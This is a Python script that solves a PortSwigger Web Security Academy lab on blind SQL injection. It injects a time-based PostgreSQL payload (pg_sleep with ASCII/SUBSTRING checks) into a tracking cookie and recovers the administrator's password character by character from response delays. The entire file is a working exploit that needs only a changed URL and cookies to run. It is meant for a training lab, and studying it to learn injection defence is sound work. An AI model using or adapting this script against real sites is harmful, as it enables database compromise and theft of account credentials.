# Lab14 from portswigger: Blind SQL injection with time delays and information retrieval

import requests
import sys
from termcolor import colored

# You can change and set the headers of your request.
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0a09006f03e6abf6c037c95100500059.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}

proxy = {"http" : "http://127.0.0.1:8080"}

admin_password=[]
def retrieve_password(url):
    for number in range(1,21): # Test each char position for the passoword(the password length is 20 char).
        for ascii_char in range(33,127): # Try the decimal numbers for each char from the ASCII table.
            payload =f"'||(SELECT pg_sleep(10) FROM users WHERE username='administrator' AND ASCII(SUBSTRING(password,{number},1))={ascii_char})--"
            
            # This is another payload using the 'WHERE' keyword.
            #payload =f"'||(SELECT CASE WHEN ASCII(SUBSTRING(password,{number},1))={ascii_char} THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--" 

            cookies={ # You must change it and set the cookies of your request.
                "TrackingId": "6HkjmITjLfqzn5pO" + payload 
                , "session": "LnCKPQqr4BWO5k2d9XqWF8zZKHvCxlY1"}
            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy)
            if response.elapsed.total_seconds() > 9:  # If a time delay happened.
                print(colored(f"\n\n[+] Correct letter: {chr(ascii_char)}\n\n", "green"))
                admin_password.append(chr(ascii_char))
                break
            else:
                print(colored(cookies["TrackingId"],"red"))
    password=''.join(admin_password)
    print(colored(f"Admin password: {password}","cyan"))
       

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example usage: {sys.argv[0]} \"example.com\"")
    else:
        url = sys.argv[1]
        retrieve_password(url)    

        
if __name__ == '__main__':
    main()
